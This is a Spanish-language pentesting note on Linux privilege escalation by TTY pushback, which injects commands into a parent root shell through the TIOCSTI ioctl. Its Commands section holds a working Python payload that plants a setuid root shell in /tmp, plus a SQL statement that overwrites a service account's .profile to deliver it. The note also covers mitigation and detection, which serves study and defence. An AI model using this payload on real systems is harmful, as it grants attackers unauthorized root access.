---
topic: TTY pushback — inyección de comandos con TIOCSTI
tags: [linux, tty, tiocsti, sudo, postgresql, privesc]
---

# TTY pushback — inyección de comandos con TIOCSTI

[🌐 English](tty-pushback-tiocsti.en.md) | **Español**

## Concepto

`TIOCSTI` permite escribir bytes en el buffer de entrada de una terminal. Un proceso hijo puede inyectar comandos que el shell padre leerá cuando recupere el control. Si el padre es una shell de root que ejecutó `su` o `sudo` de forma interactiva, los comandos se ejecutan como root sin pasar por la autenticación del hijo.

## Cuándo aplica

- Un proceso privilegiado lanza una shell o un `su` interactivo.
- El usuario controla un `.profile`, `.bashrc` o script que se ejecuta en esa sesión.
- La TTY es compartida entre el proceso hijo y el padre.
- `dev.tty.legacy_tiocsti` está habilitado (por defecto en muchos kernels).

## Procedimiento

1. Confirmar que el proceso privilegiado usa una TTY interactiva.
2. Conseguir escritura en un archivo que se ejecute al iniciar la sesión hija.
3. Inyectar con `TIOCSTI` los comandos deseados en la TTY padre.
4. Esperar a que el proceso privilegiado termine y el shell lea el buffer.

## Comandos

```python
import fcntl, termios
for ch in b"cp /bin/bash /tmp/root; chmod 6777 /tmp/root\n":
    fcntl.ioctl(0, termios.TIOCSTI, bytes([ch]))
```

```bash
# alternativa en una línea
python3 -c 'import fcntl,termios; [fcntl.ioctl(0,termios.TIOCSTI,bytes([c])) for c in b"id\n"]'
```

En PostgreSQL se puede escribir el `.profile` del usuario de servicio:

```sql
COPY (SELECT 'python3 -c "..."') TO '/var/lib/postgresql/.profile';
```

## Variantes

- Inyectar en `.bashrc` o `.profile` del usuario de servicio.
- Usar `script` o `expect` para conservar la TTY.
- Aprovechar un `su` lanzado por un cron o un script de gestión.
- Combinar con `sudo -i` si la TTY se comparte.

## Limitaciones

- Requiere una TTY interactiva y el mismo grupo de sesión.
- `TIOCSTI` puede estar deshabilitado por el kernel.
- El buffer se pierde si la sesión se cierra.
- SELinux o seccomp pueden bloquear la llamada.

## Mitigación

- Deshabilitar `TIOCSTI` con `dev.tty.legacy_tiocsti=0`.
- Evitar shells interactivas en scripts privilegiados.
- No permitir escritura en `.profile`/`.bashrc` de cuentas de servicio.
- Usar `sudo` con comandos concretos y `use_pty`.

## Detección

- Llamadas a `ioctl` con `TIOCSTI` (auditd, seccomp).
- Comandos inesperados ejecutados por root tras un `su`.
- Cambios en `.profile` de usuarios de base de datos.
- Procesos hijos que escriben en la TTY padre.

## Referencias

- [man — ioctl_tty](https://man7.org/linux/man-pages/man2/ioctl_tty.2.html)
- [Linux kernel — legacy_tiocsti](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html)
- [0xdf — Download](https://0xdf.gitlab.io/2023/11/11/htb-download.html)
